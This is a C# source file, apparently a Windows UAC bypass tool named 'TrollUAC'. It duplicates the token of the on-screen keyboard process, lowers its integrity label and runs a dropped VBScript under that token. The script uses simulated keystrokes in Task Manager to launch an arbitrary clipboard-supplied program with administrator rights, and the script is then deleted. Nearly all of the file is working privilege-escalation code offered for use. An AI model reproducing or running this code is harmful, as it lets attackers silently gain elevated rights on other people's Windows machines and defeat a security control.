using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Windows.Forms;

public class TrollUAC
{

    public static void uiAccessPlease(string path)
    {

        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
        IntPtr hToken = new IntPtr();
        IntPtr DuplicatedToken = new IntPtr();
        IntPtr sidPtr = new IntPtr();
        ConvertStringSidToSidW("ME", out sidPtr);
        var tokenMandatoryLabel = new TOKEN_MANDATORY_LABEL(sidPtr);
        int TokenIntegrityLevel = 25;
        var si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(si);
        var pi = new PROCESS_INFORMATION();


        int oskPID = spawn(@"C:\windows\system32\osk.exe");

        IntPtr hProcess = OpenProcess(ProcessAccessFlags.QueryLimitedInformation, true, oskPID);
        if (Error("OpenProcess")) return;

        OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken);
        if (Error("OpenProcessToken")) return;

        Process.GetProcessById(oskPID).Kill();
        if (Error("Killing osk process")) return;

        DuplicateTokenEx(hToken, (uint)(TokenAccessLevels.AllAccess), ref sa, 2, 1, ref DuplicatedToken);
        if (Error("DuplicateTokenEx")) return;

        SetTokenInformation(DuplicatedToken, TokenIntegrityLevel, tokenMandatoryLabel, Marshal.SizeOf(tokenMandatoryLabel) + GetLengthSid(sidPtr));
        if (Error("SetTokenInformation")) return;

        Console.WriteLine(@"[+] Spitting troll.vbs into c:\users\public\troll.vbs");
        if (!SpitFile(@"C:\users\public\troll.vbs")) return;

        Console.WriteLine("[+] Using C# to set clipboard instead of vbs out of convenience");
        Clipboard.SetText(path);

        CreateProcessAsUser(DuplicatedToken, null, @"cscript.exe //NOLOGO c:\users\public\troll.vbs", ref sa, ref sa, true, 0, IntPtr.Zero, null, ref si, out pi);  //replace 0 with 0x00000010 for new window
        if (Error("CreateProcessAsUser")) return;

        Console.WriteLine(@"[+] Attempting to delete troll.vbs from c:\users\public\troll.vbs");
        if (!DeleteFile(@"C:\users\public\troll.vbs")) return;


    }


    public static bool SpitFile(string path)
    {
        bool ret;
        string vbs_script = @"
                                
                           ' Open taskmgr 
                            Set troll = WScript.CreateObject(""WScript.Shell"")
                            troll.Run ""taskmgr.exe""

                            ' Give taskmgr time to load
                            WScript.Sleep 1000 

                            troll.SendKeys ""%""
                            WScript.Sleep 500
                            troll.SendKeys ""{F}""
                            WScript.Sleep 500
                            troll.SendKeys ""{ENTER}""
                            WScript.Sleep 500
                            
                            ' Paste value from c# clipboard
                            troll.SendKeys ""^v""
                            troll.SendKeys ""{TAB}""
                            WScript.Sleep 500
                            troll.SendKeys ""{+}""
                            WScript.Sleep 500
                            troll.SendKeys ""{ENTER}""

                            'kill task manager
                            WScript.Sleep 500
                            troll.AppActivate(""Task Manager"")
                            troll.SendKeys ""%{f4}""

                         ";

        try
        {
            System.IO.File.WriteAllText(path, vbs_script);
            Console.WriteLine("[+] Succeeded to spit file");
            ret = true;
        }
        catch (Exception e)
        {
            Console.WriteLine("[+] Failed to spit file");
            ret = false;
        }
        return ret;

    }

    public static bool DeleteFile(string path)
    {
        bool ret;
        Process[] pname;

        for (int i = 0; i < 3; i++)
        {
            System.Threading.Thread.Sleep(5000);
            pname = Process.GetProcessesByName("taskmgr");
            if (pname.Length == 0) break;

        }

        try
        {
            System.IO.File.Delete(path);
            Console.WriteLine("[+] Succeeded to delete file");
            ret = true;
        }
        catch (Exception e)
        {
            Console.WriteLine("[+] Failed to delete file");
            ret = false;
        }
        return ret;

    }

    public static int spawn(string process)
    {
        Process P = new Process();
        P.StartInfo.FileName = process;
        P.Start();


        Console.WriteLine("[+] replaced PID = ".Replace("replaced", process) + P.Id);
        System.Threading.Thread.Sleep(500);
        return P.Id;

    }

    public static bool Error(string message)
    {
        if (GetLastError() == 0)
        {
            Console.WriteLine("[+] GetLastError of message: ".Replace("message", message) + GetLastError());
            return false;
        }
        else
        {
            Console.WriteLine("[+] GetLastError of message: ".Replace("message", message) + GetLastError());
            return true;
        }

    }



    #region Pinvoke 


    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
     ProcessAccessFlags processAccess,
     bool bInheritHandle,
     int processId);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);


    [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
    public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, int TokenType, int ImpersonationLevel, ref IntPtr DuplicateTokenHandle);

    [DllImport("Advapi32.dll", SetLastError = true)]
    private static extern bool SetTokenInformation(
            IntPtr TokenHandle,
            int TokenInformationClass, // TOKEN_INFORMATION_CLASS enum
            TOKEN_MANDATORY_LABEL TokenInformation,
            int TokenInformationLength);


    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessAsUser(
       IntPtr hToken,
       string lpApplicationName,
       string lpCommandLine,
       ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes,
       bool bInheritHandles,
       uint dwCreationFlags,
       IntPtr lpEnvironment,
       string lpCurrentDirectory,
       ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);


    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();

    [DllImport("Advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode, ExactSpelling = true)]
    private static extern bool ConvertStringSidToSidW(string sid, out IntPtr psid);

    [DllImport("Advapi32.dll")]
    private static extern int GetLengthSid(IntPtr pSid);

    #endregion

    #region enums
    // Constants that are going to be used during our procedure.
    private const int ANYSIZE_ARRAY = 1;
    public static uint SE_PRIVILEGE_ENABLED = 0x00000002;
    public static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
    public static uint STANDARD_RIGHTS_READ = 0x00020000;
    public static uint TOKEN_ASSIGN_PRIMARY = 0x00000001;
    public static uint TOKEN_DUPLICATE = 0x00000002;
    public static uint TOKEN_IMPERSONATE = 0x00000004;
    public static uint TOKEN_QUERY = 0x00000008;
    public static uint TOKEN_QUERY_SOURCE = 0x00000010;
    public static uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    public static uint TOKEN_ADJUST_GROUPS = 0x00000040;
    public static uint TOKEN_ADJUST_DEFAULT = 0x00000080;
    public static uint TOKEN_ADJUST_SESSIONID = 0x00000100;
    public static uint TOKEN_READ = STANDARD_RIGHTS_READ | TOKEN_QUERY;
    public static uint TOKEN_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;


    [Flags]
    public enum ProcessAccessFlags : uint
    {
        QueryLimitedInformation = 0x00001000,
    }


    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int Length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    private class SID_AND_ATTRIBUTES
    {
        public IntPtr Sid = IntPtr.Zero;
        public uint Attributes = 0x00000020; // SE_GROUP_INTEGRITY
    }

    [StructLayout(LayoutKind.Sequential)]
    private class TOKEN_MANDATORY_LABEL
    {
        public TOKEN_MANDATORY_LABEL(IntPtr sidPtr)
        {
            Label.Sid = sidPtr;
            // Label.Attributes = 0x00000020;
        }
        public SID_AND_ATTRIBUTES Label = new SID_AND_ATTRIBUTES();

    }


    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;

    }

    #endregion


}


